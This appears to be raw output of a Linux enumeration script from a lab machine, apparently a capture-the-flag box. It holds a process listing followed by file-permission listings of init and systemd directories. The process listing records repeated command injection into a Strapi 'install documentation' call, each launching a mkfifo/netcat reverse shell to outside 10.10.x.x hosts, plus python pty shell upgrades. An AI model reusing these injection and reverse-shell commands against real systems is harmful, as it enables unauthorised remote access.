strapi    36176  0.0  0.1  15724  2252 ?        S    Jan10   0:00 nc 10.10.14.198 1234
strapi    36374  0.0  2.0 805304 41084 ?        Sl   Jan10   0:00 npm
strapi    36392  0.0  0.0   4640   860 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 9001 >/tmp/f)"
strapi    36393  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 9001 >/tmp/f)"
strapi    36396  0.0  0.0   6328   752 ?        S    Jan10   0:00 cat /tmp/f
strapi    36397  0.0  0.0   4640   876 ?        S    Jan10   0:00 /bin/sh -i
strapi    36398  0.0  0.1  15724  2248 ?        S    Jan10   0:00 nc 10.10.14.138 9001
strapi    36404  0.0  0.4  38976  9736 ?        S    Jan10   0:00 python3 -cimport pty;pty.spawn("/bin/bash")
strapi    36405  0.0  0.2  21364  4904 pts/12   Ss+  Jan10   0:00 /bin/bash
strapi    36579  0.0  0.1  15724  2212 ?        S    Jan10   0:00 nc 10.10.14.198 1234
strapi    36710  0.0  2.0 805112 40900 ?        Sl   Jan10   0:00 npm
strapi    36728  0.0  0.0   4640   836 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 1234 > /tmp/f)"
strapi    36729  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 1234 > /tmp/f)"
strapi    36732  0.0  0.0   6328   744 ?        S    Jan10   0:00 cat /tmp/f
strapi    36733  0.0  0.0   4640   936 ?        S    Jan10   0:00 /bin/sh -i
strapi    36734  0.0  0.1  15724  2228 ?        S    Jan10   0:00 nc 10.10.16.41 1234
strapi    36783  0.0  0.3  34912  7656 ?        S    Jan10   0:00 python -c import pty;pty.spawn('/bin/bash');
strapi    36784  0.0  0.2  21364  5136 pts/14   Ss+  Jan10   0:00 /bin/bash
strapi    36809  0.0  2.0 804992 40620 ?        Sl   Jan10   0:00 npm
strapi    36827  0.0  0.0   4640   828 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.38 6969 >/tmp/f)"
strapi    36828  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.38 6969 >/tmp/f)"
strapi    36831  0.0  0.0   6328   840 ?        S    Jan10   0:00 cat /tmp/f
strapi    36832  0.0  0.0   4640   892 ?        S    Jan10   0:00 /bin/sh -i
strapi    36833  0.0  0.1  15724  2200 ?        S    Jan10   0:00 nc 10.10.16.38 6969
strapi    36899  0.0  0.3  34780  7368 ?        S    Jan10   0:00 python -c import pty; pty.spawn("/bin/sh")
strapi    36900  0.0  0.0   4640  1788 pts/16   Ss+  Jan10   0:00 /bin/sh
strapi    36946  0.0  2.0 805108 40904 ?        Sl   Jan10   0:00 npm
strapi    36964  0.0  0.0   4640   836 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 9001 >/tmp/f)"
strapi    36965  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 9001 >/tmp/f)"
strapi    36968  0.0  0.0   6328   780 ?        S    Jan10   0:00 cat /tmp/f
strapi    36969  0.0  0.0   4640   896 ?        S    Jan10   0:00 /bin/sh -i
strapi    36970  0.0  0.1  15724  2156 ?        S    Jan10   0:00 nc 10.10.14.138 9001
strapi    36975  0.0  0.4  39104  9904 ?        S    Jan10   0:00 python3 -cimport pty;pty.spawn("/bin/bash")
strapi    36976  0.0  0.2  21364  4852 pts/15   Ss+  Jan10   0:00 /bin/bash
strapi    37178  0.0  2.0 804992 40828 ?        Sl   Jan10   0:00 npm
strapi    37196  0.0  0.0   4640   932 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 9001 >/tmp/f)"
strapi    37197  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.138 9001 >/tmp/f)"
strapi    37200  0.0  0.0   6328   784 ?        S    Jan10   0:00 cat /tmp/f
strapi    37201  0.0  0.0   4640   784 ?        S    Jan10   0:00 /bin/sh -i
strapi    37202  0.0  0.1  15724  2020 ?        S    Jan10   0:00 nc 10.10.14.138 9001
strapi    37249  0.0  2.0 805048 40528 ?        Sl   Jan10   0:00 npm
strapi    37267  0.0  0.0   4640   820 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |/bin/sh -i 2>&1 | nc 10.10.14.198 1234 > /tmp/f)"
strapi    37268  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |/bin/sh -i 2>&1 | nc 10.10.14.198 1234 > /tmp/f)"
strapi    37271  0.0  0.0   6328   752 ?        S    Jan10   0:00 cat /tmp/f
strapi    37272  0.0  0.0   4640  1708 ?        S    Jan10   0:00 /bin/sh -i
strapi    37273  0.0  0.1  15724  2072 ?        S    Jan10   0:00 nc 10.10.14.198 1234
strapi    37969  0.0  2.0 805692 41284 ?        Sl   Jan10   0:00 npm
strapi    37987  0.0  0.0   4640   932 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 1234 > /tmp/f)"
strapi    37988  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 1234 > /tmp/f)"
strapi    37991  0.0  0.0   6328   752 ?        S    Jan10   0:00 cat /tmp/f
strapi    37992  0.0  0.0   4640   824 ?        S    Jan10   0:00 /bin/sh -i
strapi    37993  0.0  0.1  15724  2224 ?        S    Jan10   0:00 nc 10.10.16.41 1234
strapi    38012  0.0  0.3  34780  7464 ?        S    Jan10   0:00 python -c import pty;pty.spawn('/bin/bash');
strapi    38013  0.0  0.2  21364  5132 pts/7    Ss+  Jan10   0:00 /bin/bash
strapi    38148  0.0  2.0 804856 40648 ?        Sl   Jan10   0:00 npm
strapi    38166  0.0  0.0   4640   780 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 1234 > /tmp/f)"
strapi    38167  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 1234 > /tmp/f)"
strapi    38170  0.0  0.0   6328   836 ?        S    Jan10   0:00 cat /tmp/f
strapi    38171  0.0  0.0   4640   788 ?        S    Jan10   0:00 /bin/sh -i
strapi    38172  0.0  0.1  15724  2156 ?        S    Jan10   0:00 nc 10.10.16.41 1234
strapi    38191  0.0  0.3  34780  7464 ?        S    Jan10   0:00 python -c import pty;pty.spawn('/bin/bash');
strapi    38192  0.0  0.2  21364  4888 pts/17   Ss+  Jan10   0:00 /bin/bash
strapi    38304  0.0  2.0 805000 40592 ?        Sl   Jan10   0:00 npm
strapi    38322  0.0  0.0   4640   896 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 1234 > /tmp/f)"
strapi    38323  0.0  0.0   4640   104 ?        S    Jan10   0:00 sh -c strapi "install" "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.41 1234 > /tmp/f)"
strapi    38326  0.0  0.0   6328   752 ?        S    Jan10   0:00 cat /tmp/f
strapi    38327  0.0  0.0   4640   892 ?        S    Jan10   0:00 /bin/sh -i
strapi    38328  0.0  0.1  15724  2268 ?        S    Jan10   0:00 nc 10.10.16.41 1234
strapi    38347  0.0  0.3  34780  7444 ?        S    Jan10   0:00 python -c import pty;pty.spawn('/bin/bash');
strapi    38348  0.0  0.2  21496  5300 pts/18   Ss+  Jan10   0:00 /bin/bash
strapi    38911  0.0  0.3  34780  7568 ?        S    Jan10   0:00 python -c import pty; pty.spawn("/bin/sh")
strapi    38912  0.0  0.0   4640   828 pts/13   Ss   Jan10   0:00 /bin/sh
strapi    38913  0.0  0.3  34780  7600 pts/13   S+   Jan10   0:00 python -c import pty; pty.spawn("/bin/sh")
strapi    38914  0.0  0.0   4640   836 pts/19   Ss   Jan10   0:00 /bin/sh
strapi    38915  0.0  0.3  34780  7376 pts/19   S+   Jan10   0:00 python -c import pty; pty.spawn("/bin/sh")
strapi    38916  0.0  0.0   4640  1720 pts/20   Ss+  Jan10   0:00 /bin/sh
strapi    43066  0.0  2.0 805016 40596 ?        Sl   00:02   0:00 npm
strapi    43084  0.0  0.0   4640   896 ?        S    00:02   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.26 53 > backpipe ; rm backpipe)"
strapi    43085  0.0  0.0   4640   108 ?        S    00:02   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.26 53 > backpipe ; rm backpipe)"
strapi    43087  0.0  0.1  11604  3184 ?        S    00:02   0:00 /bin/bash
strapi    43121  0.0  2.0 805172 40436 ?        Sl   00:03   0:00 npm
strapi    43139  0.0  0.0   4640   892 ?        S    00:03   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.217 53 > backpipe ; rm backpipe)"
strapi    43140  0.0  0.0   4640   104 ?        S    00:03   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.217 53 > backpipe ; rm backpipe)"
strapi    43142  0.0  0.1  11604  3232 ?        S    00:03   0:00 /bin/bash
strapi    43143  0.0  0.1  15724  2248 ?        S    00:03   0:00 nc 10.10.14.217 53
strapi    43779  0.0  2.0 805032 40536 ?        Sl   00:21   0:00 npm
strapi    43797  0.0  0.0   4640   840 ?        S    00:21   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.217 53 > backpipe ; rm backpipe)"
strapi    43798  0.0  0.0   4640   108 ?        S    00:21   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.217 53 > backpipe ; rm backpipe)"
strapi    43800  0.0  0.1  11604  3256 ?        S    00:21   0:00 /bin/bash
strapi    43801  0.0  0.1  15724  2168 ?        S    00:21   0:00 nc 10.10.14.217 53
strapi    43863  0.0  2.0 805124 40724 ?        Sl   00:23   0:00 npm
strapi    43881  0.0  0.0   4640   828 ?        S    00:23   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.217 53 > backpipe ; rm backpipe)"
strapi    43882  0.0  0.0   4640   104 ?        S    00:23   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.217 53 > backpipe ; rm backpipe)"
strapi    43884  0.0  0.1  11604  3128 ?        S    00:23   0:00 /bin/bash
strapi    43885  0.0  0.1  15724  2208 ?        S    00:23   0:00 nc 10.10.14.217 53
strapi    44790  0.0  2.0 805032 40600 ?        Sl   00:38   0:00 npm
strapi    44808  0.0  0.0   4640   932 ?        S    00:38   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.217 53 > backpipe ; rm backpipe)"
strapi    44809  0.0  0.0   4640   104 ?        S    00:38   0:00 sh -c strapi "install" "documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.217 53 > backpipe ; rm backpipe)"
strapi    44811  0.0  0.1  11604  3408 ?        S    00:38   0:00 /bin/bash
strapi    44812  0.0  0.1  15724  2208 ?        S    00:38   0:00 nc 10.10.14.217 53
strapi    45823  0.0  0.0   4636  1668 pts/21   Ss   01:05   0:00 -sh
strapi    46188  0.0  0.2  21412  5348 pts/21   S    01:14   0:00 bash
strapi    46663  0.0  0.2  12524  4124 pts/21   S+   01:23   0:00 /bin/bash ./file
strapi    46664  0.0  0.1  12524  3108 pts/21   S+   01:23   0:00 /bin/bash ./file
strapi    46665  0.0  0.0   6188   780 pts/21   S+   01:23   0:00 tee -a
strapi    46869  0.0  0.1  12524  2856 pts/21   S+   01:24   0:00 /bin/bash ./file
strapi    46870  0.0  0.1  36084  3308 pts/21   R+   01:24   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
1.1M -rwxr-xr-x 1 root root 1.1M Jun  6  2019 /bin/bash
   0 lrwxrwxrwx 1 root root    4 Aug  6  2020 /bin/sh -> dash
1.6M -rwxr-xr-x 1 root root 1.6M Jul 26 15:31 /lib/systemd/systemd


[-] /etc/init.d/ binary permissions:
total 192
drwxr-xr-x  2 root root 4096 Aug 23 11:29 .
drwxr-xr-x 99 root root 4096 Aug 23 11:29 ..
-rwxr-xr-x  1 root root 2269 Apr 22  2017 acpid
-rwxr-xr-x  1 root root 8181 Jul 16  2019 apache2
-rwxr-xr-x  1 root root 2489 Jul 16  2019 apache-htcacheclean
-rwxr-xr-x  1 root root 4335 Mar 22  2018 apparmor
-rwxr-xr-x  1 root root 2805 Feb 27  2020 apport
-rwxr-xr-x  1 root root 1071 Aug 21  2015 atd
-rwxr-xr-x  1 root root 1232 Apr 19  2018 console-setup.sh
-rwxr-xr-x  1 root root 3049 Nov 16  2017 cron
-rwxr-xr-x  1 root root  937 Mar 18  2018 cryptdisks
-rwxr-xr-x  1 root root  978 Mar 18  2018 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Nov 15  2017 dbus
-rwxr-xr-x  1 root root 4489 Jun 28  2018 ebtables
-rwxr-xr-x  1 root root  985 Feb 23  2021 grub-common
-rwxr-xr-x  1 root root 3809 Feb 14  2018 hwclock.sh
-rwxr-xr-x  1 root root 2444 Oct 25  2017 irqbalance
-rwxr-xr-x  1 root root 1503 May 11  2020 iscsid
-rwxr-xr-x  1 root root 1479 Feb 15  2018 keyboard-setup.sh
-rwxr-xr-x  1 root root 2044 Aug 15  2017 kmod
-rwxr-xr-x  1 root root  695 Jan 23  2020 lvm2
-rwxr-xr-x  1 root root  571 Jan 23  2020 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Jan 23  2020 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2378 Mar 31  2020 lxcfs
-rwxr-xr-x  1 root root 2653 Jan 14  2020 mdadm
-rwxr-xr-x  1 root root 1249 Oct 22  2019 mdadm-waitidle
-rwxr-xr-x  1 root root 5607 Jan 12  2018 mysql
-rwxr-xr-x  1 root root 4597 Nov 25  2016 networking
-rwxr-xr-x  1 root root 4579 Apr  6  2018 nginx
-rwxr-xr-x  1 root root 2503 May 11  2020 open-iscsi
-rwxr-xr-x  1 root root 1846 Dec  9  2019 open-vm-tools
-rwxr-xr-x  1 root root 1366 Apr  4  2019 plymouth
-rwxr-xr-x  1 root root  752 Apr  4  2019 plymouth-log
-rwxr-xr-x  1 root root 1191 Jan 17  2018 procps
-rwxr-xr-x  1 root root 4355 Feb 14  2020 rsync
-rwxr-xr-x  1 root root 2864 Jan 14  2018 rsyslog
-rwxr-xr-x  1 root root 1222 May 21  2017 screen-cleanup
-rwxr-xr-x  1 root root 3837 Jan 25  2018 ssh
-rwxr-xr-x  1 root root 5974 Apr 20  2018 udev
-rwxr-xr-x  1 root root 1306 Mar  5  2020 uuidd


[-] /etc/init/ config file permissions:
total 12
drwxr-xr-x  2 root root 4096 Aug  3 21:16 .
drwxr-xr-x 99 root root 4096 Aug 23 11:29 ..
-rw-r--r--  1 root root 1757 Jan 12  2018 mysql.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 7.3M
drwxr-xr-x 23 root root  36K Aug 23 11:28 system
drwxr-xr-x  2 root root 4.0K Aug 23 11:28 network
drwxr-xr-x  2 root root 4.0K Aug 23 11:28 system-generators
drwxr-xr-x  2 root root 4.0K Aug 23 11:28 system-preset
drwxr-xr-x  2 root root 4.0K Aug  3 21:21 system-sleep
-rw-r--r--  1 root root 2.3M Jul 26 15:31 libsystemd-shared-237.so
-rw-r--r--  1 root root  699 Jul 26 15:31 resolv.conf
-rwxr-xr-x  1 root root 1.3K Jul 26 15:31 set-cpufreq
-rwxr-xr-x  1 root root 1.6M Jul 26 15:31 systemd
-rwxr-xr-x  1 root root 6.0K Jul 26 15:31 systemd-ac-power
-rwxr-xr-x  1 root root  18K Jul 26 15:31 systemd-backlight
-rwxr-xr-x  1 root root  11K Jul 26 15:31 systemd-binfmt
-rwxr-xr-x  1 root root  10K Jul 26 15:31 systemd-cgroups-agent
-rwxr-xr-x  1 root root  27K Jul 26 15:31 systemd-cryptsetup
-rwxr-xr-x  1 root root  15K Jul 26 15:31 systemd-dissect
-rwxr-xr-x  1 root root  18K Jul 26 15:31 systemd-fsck
-rwxr-xr-x  1 root root  23K Jul 26 15:31 systemd-fsckd
-rwxr-xr-x  1 root root  19K Jul 26 15:31 systemd-growfs
-rwxr-xr-x  1 root root  10K Jul 26 15:31 systemd-hibernate-resume
-rwxr-xr-x  1 root root  23K Jul 26 15:31 systemd-hostnamed
-rwxr-xr-x  1 root root  15K Jul 26 15:31 systemd-initctl
-rwxr-xr-x  1 root root 127K Jul 26 15:31 systemd-journald
-rwxr-xr-x  1 root root  35K Jul 26 15:31 systemd-localed
-rwxr-xr-x  1 root root 215K Jul 26 15:31 systemd-logind
-rwxr-xr-x  1 root root  10K Jul 26 15:31 systemd-makefs
-rwxr-xr-x  1 root root  15K Jul 26 15:31 systemd-modules-load
-rwxr-xr-x  1 root root 1.6M Jul 26 15:31 systemd-networkd
-rwxr-xr-x  1 root root  19K Jul 26 15:31 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  11K Jul 26 15:31 systemd-quotacheck
-rwxr-xr-x  1 root root  10K Jul 26 15:31 systemd-random-seed
-rwxr-xr-x  1 root root  15K Jul 26 15:31 systemd-remount-fs
-rwxr-xr-x  1 root root  10K Jul 26 15:31 systemd-reply-password
-rwxr-xr-x  1 root root 375K Jul 26 15:31 systemd-resolved
-rwxr-xr-x  1 root root  19K Jul 26 15:31 systemd-rfkill
-rwxr-xr-x  1 root root  43K Jul 26 15:31 systemd-shutdown
-rwxr-xr-x  1 root root  19K Jul 26 15:31 systemd-sleep
-rwxr-xr-x  1 root root  23K Jul 26 15:31 systemd-socket-proxyd
-rwxr-xr-x  1 root root  11K Jul 26 15:31 systemd-sulogin-shell
-rwxr-xr-x  1 root root  15K Jul 26 15:31 systemd-sysctl
-rwxr-xr-x  1 root root  27K Jul 26 15:31 systemd-timedated
-rwxr-xr-x  1 root root  39K Jul 26 15:31 systemd-timesyncd
-rwxr-xr-x  1 root root 571K Jul 26 15:31 systemd-udevd
-rwxr-xr-x  1 root root  15K Jul 26 15:31 systemd-update-utmp
-rwxr-xr-x  1 root root  10K Jul 26 15:31 systemd-user-sessions
-rwxr-xr-x  1 root root  10K Jul 26 15:31 systemd-veritysetup
-rwxr-xr-x  1 root root  10K Jul 26 15:31 systemd-volatile-root
-rwxr-xr-x  1 root root 1.3K May 27  2021 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Aug  6  2020 system-shutdown

/lib/systemd/system:
total 1.1M
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 getty.target.wants
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 timers.target.wants
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Aug 23 11:28 user@.service.d
drwxr-xr-x 2 root root 4.0K Aug  3 21:15 apache2.service.d
-rw-r--r-- 1 root root  278 Jul 27 13:53 ua-messaging.service
-rw-r--r-- 1 root root  177 Jul 27 13:53 ua-messaging.timer
-rw-r--r-- 1 root root  323 Jul 27 13:53 ua-reboot-cmds.service
lrwxrwxrwx 1 root root   14 Jul 26 15:31 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 checkroot.service -> /dev/null
-rw-r--r-- 1 root root 1.1K Jul 26 15:31 console-getty.service
-rw-r--r-- 1 root root 1.3K Jul 26 15:31 container-getty@.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Jul 26 15:31 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Jul 26 15:31 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Jul 26 15:31 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Jul 26 15:31 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   25 Jul 26 15:31 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Jul 26 15:31 debug-shell.service
lrwxrwxrwx 1 root root   16 Jul 26 15:31 default.target -> graphical.target
-rw-r--r-- 1 root root  797 Jul 26 15:31 emergency.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 fuse.service -> /dev/null
-rw-r--r-- 1 root root 2.0K Jul 26 15:31 getty@.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 hwclock.service -> /dev/null
-rw-r--r-- 1 root root  670 Jul 26 15:31 initrd-cleanup.service
-rw-r--r-- 1 root root  830 Jul 26 15:31 initrd-parse-etc.service
-rw-r--r-- 1 root root  589 Jul 26 15:31 initrd-switch-root.service
-rw-r--r-- 1 root root  704 Jul 26 15:31 initrd-udevadm-cleanup-db.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Jul 26 15:31 kmod.service -> systemd-modules-load.service
-rw-r--r-- 1 root root  717 Jul 26 15:31 kmod-static-nodes.service
lrwxrwxrwx 1 root root   28 Jul 26 15:31 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Jul 26 15:31 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  609 Jul 26 15:31 quotaon.service
-rw-r--r-- 1 root root  716 Jul 26 15:31 rc-local.service
lrwxrwxrwx 1 root root   16 Jul 26 15:31 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 reboot.service -> /dev/null
-rw-r--r-- 1 root root  788 Jul 26 15:31 rescue.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Jul 26 15:31 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Jul 26 15:31 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Jul 26 15:31 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jul 26 15:31 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jul 26 15:31 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Jul 26 15:31 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Jul 26 15:31 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Jul 26 15:31 sendsigs.service -> /dev/null
-rw-r--r-- 1 root root 1.5K Jul 26 15:31 serial-getty@.service
lrwxrwxrwx 1 root root    9 Jul 26 15:31 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jul 26 15:31 stop-bootlogd-single.service -> /dev/null
-rw-r--r-- 1 root root  554 Jul 26 15:31 suspend-then-hibernate.target
-rw-r--r-- 1 root root  724 Jul 26 15:31 systemd-ask-password-console.service
-rw-r--r-- 1 root root  752 Jul 26 15:31 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  752 Jul 26 15:31 systemd-backlight@.service
-rw-r--r-- 1 root root  999 Jul 26 15:31 systemd-binfmt.service
-rw-r--r-- 1 root root  537 Jul 26 15:31 systemd-exit.service
-rw-r--r-- 1 root root  551 Jul 26 15:31 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Jul 26 15:31 systemd-fsckd.socket
-rw-r--r-- 1 root root  714 Jul 26 15:31 systemd-fsck-root.service
-rw-r--r-- 1 root root  715 Jul 26 15:31 systemd-fsck@.service
-rw-r--r-- 1 root root  584 Jul 26 15:31 systemd-halt.service
-rw-r--r-- 1 root root  671 Jul 26 15:31 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  541 Jul 26 15:31 systemd-hibernate.service
-rw-r--r-- 1 root root 1.2K Jul 26 15:31 systemd-hostnamed.service
-rw-r--r-- 1 root root  818 Jul 26 15:31 systemd-hwdb-update.service
-rw-r--r-- 1 root root  559 Jul 26 15:31 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  551 Jul 26 15:31 systemd-initctl.service
-rw-r--r-- 1 root root  686 Jul 26 15:31 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.6K Jul 26 15:31 systemd-journald.service
-rw-r--r-- 1 root root  771 Jul 26 15:31 systemd-journal-flush.service
-rw-r--r-- 1 root root  597 Jul 26 15:31 systemd-kexec.service
-rw-r--r-- 1 root root 1.2K Jul 26 15:31 systemd-localed.service
-rw-r--r-- 1 root root 1.5K Jul 26 15:31 systemd-logind.service
-rw-r--r-- 1 root root  733 Jul 26 15:31 systemd-machine-id-commit.service
-rw-r--r-- 1 root root 1007 Jul 26 15:31 systemd-modules-load.service
-rw-r--r-- 1 root root 1.9K Jul 26 15:31 systemd-networkd.service
-rw-r--r-- 1 root root  740 Jul 26 15:31 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  593 Jul 26 15:31 systemd-poweroff.service
-rw-r--r-- 1 root root  655 Jul 26 15:31 systemd-quotacheck.service
-rw-r--r-- 1 root root  792 Jul 26 15:31 systemd-random-seed.service
-rw-r--r-- 1 root root  588 Jul 26 15:31 systemd-reboot.service
-rw-r--r-- 1 root root  833 Jul 26 15:31 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.7K Jul 26 15:31 systemd-resolved.service
-rw-r--r-- 1 root root  724 Jul 26 15:31 systemd-rfkill.service
-rw-r--r-- 1 root root  537 Jul 26 15:31 systemd-suspend.service
-rw-r--r-- 1 root root  573 Jul 26 15:31 systemd-suspend-then-hibernate.service
-rw-r--r-- 1 root root  693 Jul 26 15:31 systemd-sysctl.service
-rw-r--r-- 1 root root 1.1K Jul 26 15:31 systemd-timedated.service
-rw-r--r-- 1 root root 1.4K Jul 26 15:31 systemd-timesyncd.service
-rw-r--r-- 1 root root  659 Jul 26 15:31 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  764 Jul 26 15:31 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  744 Jul 26 15:31 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root 1006 Jul 26 15:31 systemd-udevd.service
